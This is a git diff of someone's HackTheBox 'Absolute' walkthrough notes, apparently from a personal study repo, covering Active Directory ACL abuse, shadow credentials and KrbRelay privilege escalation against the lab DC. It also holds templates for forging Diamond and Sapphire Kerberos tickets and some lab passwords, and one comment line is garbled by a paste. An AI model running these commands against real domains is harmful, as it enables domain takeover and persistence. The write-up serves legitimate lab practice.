@@ -1,7 +1,7 @@
 # Absolute Helped-Through
 
 Name: Absolute
-Date:  
+Date:  29/9/2023
 Difficulty:  Insane - but not hard as when released due to AD hacking Tool issues
 Goals:  
 - Azure AD changes overhaul
@@ -10,11 +10,23 @@ Goals:
 Learnt:
 - [tron for Cleaning your Windows](https://github.com/bmrf/tron)
 - `grep -B $LinesBefore -A $LinesAfter `
-- `ntpdate -s` multiple times to be very very safe!  
+- `ntpdate -s` multiple times to be very very safe! -  **unless you force the VM to not sync to host!**
 	- Actually over and over and over again
-- [Skew-whiff](https://dictionary.cambridge.org/dictionary/english/skew-whiff)  is hyphenated and again the clock Skew is just a every time before anything command
+	- [Skew-whiff](https://dictionary.cambridge.org/dictionary/english/skew-whiff)  is hyphenated and again the clock Skew is just a every time before anything command - unless you force the VM to not sync to host!
 - Impacket branches and various functionality not in the main branch
 - samba.org `net` commands 
+- RunAsC.exe is a cool when runas is not available
+- Azure AD and Activity Directory 
+- More AD ACL abuse 
+- Shadow Credentials
+- KrbRelay 
+- More Bloodhound 
+- DNS and AD configuration
+- All the Linux to AD configuration requirements and weirdness!
+- How to share a VM through a Host machine to access the VPN!
+- More AD CS nooblet scratchings at the surface 
+- The in the real world the tools are broken and need modifications, investigation screenshots for exact run conditions
+- Four months dedication to know too much Windows :) 
 Beyond Root:
 - Silver, Golden, Diamond and Sapphire Tickets
 - Author and manage a Azure Policy for Kerberos and research that
@@ -31,7 +43,6 @@ Tripletted with [[Response-Helped-Through]] and [[Dynstr-Helped-Through]]
 [Alh4zr3d Stream](https://www.twitch.tv/videos/1855594279) - does not exist any more
 [0xDF Written Writeup](https://0xdf.gitlab.io/2023/05/27/htb-absolute.html)
 I also used the Official Write Up that is the .pdf in this directory 
-
 ## Recon
 
 The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
@@ -669,10 +680,10 @@ KRB5CCNAME=SVC_SMB.ccache impacket-smbclient -k absolute.htb/svc_smb@dc.absolute
 
 Ippsec: Python Virtual environments to manage impacket libraries and versioning
 ```python
-python3 -m venv venv
+python3 -m venv .venv
 
-source .env/bin/activate 
-pip install .
+source .venv/bin/activate 
+pip3 install .
 
 # deactivate # To deactivate virtual environment
 ```
@@ -691,7 +702,7 @@ string test.exe
 ```bash
 # Check if IP fowarding is enabled 
 cat /proc/sys/net/ipv4/ip_forward
-# Enable IP forward
+# Enable IP forwardpip3 install .
 sudo echo 1 > /proc/sys/net/ipv4/ip_forward
 # Iptables rules 
 # INTERFACE is whatever network device that is providing internet to your nic from `ip a`
@@ -856,30 +867,6 @@ As we are still in the python virtual environment I will install `certipy` with 
 pip3 install certipy-ad
 ```
 
-
-```bash
-# AbsoluteLDAP2022!
-../impacket/examples/getTGT.py absolute.htb/m.lovegod
-KRB5CCNAME=$(pwd)/m.lovegod.ccache ../impacket/examples/dacledit.py -k -no-pass -dc-ip 10.129.229.59 -principal m.lovegod -action write -target "Network Audit"  -rights FullControl absolute.htb/m.lovegod
-
-kinit m.lovegod
-net rpc group addmem "Network Audit" -k -U  m.lovegod -S dc.absolute.htb m.lovegod 
-../impacket/examples/getTGT.py absolute.htb/m.lovegod
-net rpc group members "Network Audit" -k -U m.lovegod -S dc.absolute.htb 
-
-KRB5CCANME=m.lovegod.ccache certipy shadow auto -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip 10.129.229.59 -target dc.absolute.htb -account winrm_user
-```
-
-It worked!
-![](inthegroupyeslovegodisinthegroup.png)
-
-Over four months of tinkering and learning!
-![1080](certifiedjoyiousholyhappiness.png)
-
-https://www.youtube.com/watch?v=_nGpZ1ydzS8
-
-![](winrmuserwinrmevillyso.png)
-
 #### WTF are the shadow credentials!
 
 A summary and explanation of Shadow credentials mostly from the sources: [iredteam](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials) [hacker.recipes](https://www.thehacker.recipes/a-d/movement/kerberos/shadow-credentials)
@@ -930,9 +917,38 @@ thehacker.recipes: *User objects can't edit their own `msDS-KeyCredentialLink` a
 
 [SpecterOps - Shadow Credentials Post](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
 
-## KRBRelay PrivEsc
+```bash
+# AbsoluteLDAP2022!
+../impacket/examples/getTGT.py absolute.htb/m.lovegod
+KRB5CCNAME=$(pwd)/m.lovegod.ccache ../impacket/examples/dacledit.py -k -no-pass -dc-ip 10.129.229.59 -principal m.lovegod -action write -target "Network Audit"  -rights FullControl absolute.htb/m.lovegod
 
-If LDAP signing is not enabled
+kinit m.lovegod
+net rpc group addmem "Network Audit" -k -U  m.lovegod -S dc.absolute.htb m.lovegod 
+../impacket/examples/getTGT.py absolute.htb/m.lovegod
+net rpc group members "Network Audit" -k -U m.lovegod -S dc.absolute.htb 
+
+KRB5CCNAME=m.lovegod.ccache certipy shadow auto -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip 10.129.229.59 -target dc.absolute.htb -account winrm_user
+```
+
+It worked!
+![](inthegroupyeslovegodisinthegroup.png)
+
+Over four months of tinkering and learning!
+![1080](certifiedjoyiousholyhappiness.png)
+
+https://www.youtube.com/watch?v=_nGpZ1ydzS8
+
+![](winrmuserwinrmevillyso.png)
+
+## KRBRelay PrivEsc and THE FINAL HURDLES!
+
+
+Default Windows installations, in which LDAP signing is disabled - 
+
+
+this vulnerability is patched
+
+https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html
 
 [snovvcrash](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/kerberos/kerberos-relay)
 
@@ -952,14 +968,13 @@ If LDAP signing is not enabled
 	- [https://github.com/BronzeBee/DavRelayUp](https://github.com/BronzeBee/DavRelayUp)
 	- [https://github.com/Dec0ne/DavRelayUp](https://github.com/Dec0ne/DavRelayUp)
 
-## THE FINAL HURDLE!
 
 ![](uploadafterbuilding.png)
 
 But ofcourse `evil-winrm` breaks and so does `KrbRelay.exe` - big takeway - the in the real world the tools are broken and need modifications, investigation screenshots for exact run conditions
 ![](toolosinting.png)
 
-The Writeup recommmends https://github.com/antonioCoco/RunasCs *is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials. This tool is an improved and open version of windows builtin runas.exe that solves some limitations:*
+The Writeup recommends https://github.com/antonioCoco/RunasCs *is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials. This tool is an improved and open version of windows builtin runas.exe that solves some limitations:*
 - Allows explicit credentials
 - Works both if spawned from interactive process and from service process
 - Manage properly _DACL_ for _Window Stations_ and _Desktop_ for the creation of the new process
@@ -970,24 +985,63 @@ The Writeup recommmends https://github.com/antonioCoco/RunasCs *is an utility to
 - Allows redirecting _stdin_, _stdout_ and _stderr_ to a remote host
 - It's Open Source :)
 
+Because of the insight provided by the Writeup we look for running sessions, which on a domain controller seems like a full-fruitcake non-actuality.  *"Who left the GUI session open on the DC?"*
 ![](totalnotcorrectpassword.png)
+
+Never see `evil-winrm` error out like that, but given that Ippsec also states the patched and unlikely exploitation of this as a low-priv user I am happy to copy and paste to finish this of.
+![](finally.png)
+
+Just in case as there is automation on this machine
+```powershell
+.\RunAsCs.exe winrm_user -d absolute.htb TotallyNotACorrectPassword -l 9 "C:\users\winrm_user\Documents\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -port 10 -add-groupmember Administrators winrm_user"
+```
+
+https://www.youtube.com/watch?v=rfAmMQV_wss
 
 ## Beyond Root
 
-Create and configure a DNS server  `dnscmd`
-https://learn.microsoft.com/en-us/windows-server/networking/dns/quickstart-install-configure-dns-server?tabs=powershell
+A couple of `evil-winrm` crashes latter and a sliver beacon on the machine to avoid dealing with `evil-winrm` hellscape. Also no AV evasion required or self-sign LicroSoft.com scarecrowage. For the Ticket attack research and attempt to play around I used the most up-to-date resource on the open internet on AD matter that being: https://www.thehacker.recipes. Due time restrictions and that I have already done Golden and Silver ticket attacks I will return on another box to perform these attacks.
 
-#### Silver Ticket
+#### Diamond Tickets
 
-#### Golden Ticket
+[thehacker.recipes](https://www.thehacker.recipes/a-d/movement/kerberos/forged-tickets/diamond): *Golden and Silver Tickets can usually be detected by probes that monitor the service ticket requests (`KRB_TGS_REQ`) that have no corresponding TGT requests (`KRB_AS_REQ`). Those types of tickets also feature forged PACs that sometimes fail at mimicking real ones, thus increasing their detection rates. Diamond tickets can be a useful alternative in the way they simply request a normal ticket, decrypt the PAC, modify it, recalculate the signatures and encrypt it again. It requires knowledge of the target service long-term key (can be the `krbtgt` for a TGT, or a target service for a Service Ticket).*
 
-#### Diamond Ticket
+Linux
+```bash
+# In its actual form (as of September 9th, 2022), the script doesn't modify the PAC in the ticket obtained but instead fully replaces it with a full-forged one. This is not the most stealthy approach as the forged PAC could embed wrong information. Testers are advised to opt for the sapphire ticket approach. On top of that, if there are some structure in the PAC that Impacket can't handle, those structures will be missing in the newly forged PAC.
+ticketer.py -request -domain 'DOMAIN.FQDN' -user 'domain_user' -password 'password' -nthash 'krbtgt/service NT hash' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' -user-id '1337' -groups '512,513,518,519,520' 'baduser'
+```
 
-#### Sapphire Ticket
+Windows
+```powershell
+Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS
+```
+#### Sapphire Tickets
 
+Sapphire Tickets are like Diamond Tickets, but ticket is not forged and instead is based on a legitimate ticket obtained after a request - all that is different is how the PAC is modified:
+- Diamond modifies the legitimate PAC
+- Sapphire *the PAC of another powerful user is obtained through an [S4U2self+u2u trick](https://www.thehacker.recipes/a-d/movement/kerberos#s4u2self-+-u2u)* (Service for a User user your are request the ticket on behalf of called "principal", then User to User Authentication (one user is a server and the other a client))
+	- Replacing the PAC in the legitimate ticket 
 
+*As of September 11th, 2023,  this feature is in a pull request ([#1411](https://github.com/SecureAuthCorp/impacket/pull/1411)) awaiting to be merged. 
 
+1. The `user-id` both the nthash and aeskey must be supplied. 
+2. The `-user-id` argument will be used to build the "Requestor" PAC structure, which could be needed in up-to-date environments (see warning at the bottom of this page).
 
+*The arguments used to customize the PAC will be ignored (`-groups`, `-extra-sid`,`-duration`), the required domain SID (`-domain-sid`) as well as the username supplied in the positional argument (`baduser` in this case). All these information will be kept as-is from the PAC obtained beforehand using the [S4U2self+2u](https://www.thehacker.recipes/a-d/movement/kerberos) trick* `(Service for a User user your are request the ticket on behalf of called "principal", then User to User Authentication (one user is a server and the other a client))`. 
+
+```bash
+ticketer.py -request -impersonate 'domainadmin' \
+-domain 'DOMAIN.FQDN' -user 'domain_user' -password 'password' \
+-nthash 'krbtgt NT hash' -aesKey 'krbtgt AES key' \
+-user-id '1115' -domain-sid 'S-1-5-21-...' \
+'baduser'
+```
+
+In 2021, Microsoft issued a patch ([kb5008380](https://support.microsoft.com/en-gb/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041)) - explained in this [blogpost](https://blog.netwrix.com/2022/01/10/pacrequestorenforcement-and-kerberos-authentication/) When the patch entered its enforcement phase (Oct. 11th 2022), it made the Sapphire Ticket attack harder to conduct.
+- Rubeus patch [#1391](https://github.com/fortra/impacket/pull/1391) and [#1545](https://github.com/fortra/impacket/pull/1545)
+- Impacket patches [#105](https://github.com/GhostPack/Rubeus/pull/105)
+*However, since the Sapphire Ticket technique relies on a S4U2self + U2U service ticket* `(Service for a User user your are request the ticket on behalf of called "principal", then User to User Authentication (one user is a server and the other a client))` *request to obtain a privileged user's PAC, the PAC doesn't feature the two new "Requestor" and "Attributes" structures. This is probably because the two new structures are only included in TGT's PACs and not service tickets PACs. When using the Sapphire Ticket technique to forge a TGT, if the two structures are missing from the forget ticket, a `KDC_ERR_TGT_REVOKED` error will be raised in environments that have the patch installed.*
 
 ## Azure
 
@@ -1125,18 +1179,5 @@ Regarding compliance over any PPI data of employee or App users all File shares 
 
 https://github.com/Azure/azure-quickstart-templates
 
-
-## Testing to then design of Vulnerable Machine(s)
-
-OSCP level Windows and Active Directory Jungle Gym - Brainforest
-
-- Make OSCP level 
-- Have good theme
-- Make the Kubernetes, docker container only for pivoting not for escaping especially important for the other planned boxes
-- Make uber vulnerable switch once completed
-- Ascii Art of completion
-
-test ad-init-recon and psrev-obfus scripts
-test dns-axfr and improve
 
 
